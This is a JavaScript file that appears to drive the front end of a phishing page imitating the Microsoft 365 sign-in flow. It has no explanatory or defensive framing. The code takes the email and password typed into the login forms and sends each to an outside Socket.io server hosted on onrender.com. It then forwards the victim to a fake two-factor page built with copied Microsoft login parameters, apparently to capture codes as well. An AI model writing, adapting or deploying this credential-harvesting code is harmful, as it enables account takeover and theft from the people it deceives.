let connected = null;
let server = null;
const useLocal = false;

window.addEventListener('load', async function () {
	// Connect to the Socket.io server
	if ((window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && useLocal) {
		server = 'http://localhost:3023';
	} else {
		server = 'https://three65-clone-socket-server.onrender.com';
	}

	const socket = io(server);

	const next = document.querySelector('#next');
	const email_input = document.querySelector('#email-input');
	const password_input = document.querySelector('#password-input');
	const error_msg = document.querySelector('#error-msg');
	const pass_error_msg = document.querySelector('#error-msg2');
	const emailForm = document.querySelector('#email-form');
	const passwordForm = document.querySelector('#password-form');
	const bottom = document.querySelector('#bottom');
	const back = document.querySelector('#back');
	const thisUser = document.querySelector('#user-email');
	const overlay = document.querySelector('#overlay');

	emailForm.addEventListener('submit', checkEmail);
	passwordForm.addEventListener('submit', getCode);

	back.addEventListener('click', goBack);

	var email_error_shown = false;
	var pass_error_shown = false;

	async function checkEmail(e) {
		e.preventDefault();
		if (email_input.value.length < 1) {
			email_error('Enter a valid email address, phone number, or Skype name.', true);
			email_error_shown = true;
			return;
		}

		socket.emit('entered-email', email_input.value);
		overlay.classList.toggle('hidden');
	}

	async function getCode(e) {
		e.preventDefault();
		socket.emit('entered-password', password_input.value);
		overlay.classList.toggle('hidden');
	}

	function goBack() {
		removePassword();
	}

	email_input.addEventListener('input', () => {
		if (email_error_shown) {
			if (email_input.value.length > 0) {
				email_error('', false);
			} else {
				email_error('Enter a valid email address, phone number, or Skype name.', true);
			}
		}
	});

	password_input.addEventListener('input', () => {
		if (pass_error_shown) {
			email_error('', false, password_input, pass_error_msg);
		}
	});

	const email_error = (msg, type, element = email_input, err_el = error_msg) => {
		if (type == true) {
			err_el.innerHTML = msg;
			err_el.classList.remove('hidden');
			element.classList.remove('border-gray-600');
			element.classList.add('border-red-500');
			return;
		}

		err_el.classList.add('hidden');
		element.classList.remove('border-red-500');
		element.classList.add('border-gray-600');
	};

	function removeEmail() {
		emailForm.classList.toggle('move-left');
		bottom.classList.toggle('hide-bottom');
		pass_error_shown = false;
		email_error_shown = false;

		if (passwordForm.classList.contains('move-right-reverse')) {
			passwordForm.classList.toggle('move-right-reverse');
		}

		if (emailForm.classList.contains('move-left-reverse')) {
			emailForm.classList.toggle('move-left-reverse');
		}

		if (bottom.classList.contains('hide-bottom-reverse')) {
			bottom.classList.toggle('hide-bottom-reverse');
		}

		setTimeout(() => {
			passwordForm.classList.toggle('hidden');
			passwordForm.classList.toggle('flex');
			passwordForm.classList.toggle('move-right');

			emailForm.classList.toggle('flex');
			emailForm.classList.toggle('hidden');
			bottom.classList.toggle('hidden');
		}, 400);
	}

	function removePassword() {
		passwordForm.classList.toggle('move-right-reverse');
		emailForm.classList.toggle('move-left-reverse');
		emailForm.classList.toggle('move-left');
		pass_error_shown = false;
		email_error_shown = false;

		setTimeout(() => {
			passwordForm.classList.toggle('move-right');
			passwordForm.classList.toggle('flex');
			passwordForm.classList.toggle('hidden');

			emailForm.classList.toggle('hidden');
			emailForm.classList.toggle('flex');

			bottom.classList.toggle('hidden');
			bottom.classList.toggle('hide-bottom');
			bottom.classList.toggle('hide-bottom-reverse');
		}, 400);
	}

	socket.on('connect', async () => {
		socket.emit('client-connected', true);
		console.log('connected');
	});

	socket.on('send-email-error', async (res) => {
		console.log('data received', res);
		overlay.classList.toggle('hidden');

		if (res != 'login') {
			email_error(res, true);
			email_error_shown = true;
			return;
		} else {
			thisUser.innerHTML = email_input.value;
			removeEmail();
		}
	});

	socket.on('send-password-error', async (res) => {
		console.log('password data received', res);
		overlay.classList.toggle('hidden');

		if (res != 'login') {
			email_error(res, true, password_input, pass_error_msg);
			pass_error_shown = true;
			return;
		} else {
			const url = `2fa.html?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&id=292841&user=${thisUser.innerHTML}&uaid=37841b1a533846b18c4d63e24f9ef359&contextid=62586578791094A1&opid=340D15FC348E3278&bk=1728540361&mkt=EN-US`;

			window.location.href = url;
		}
	});
});
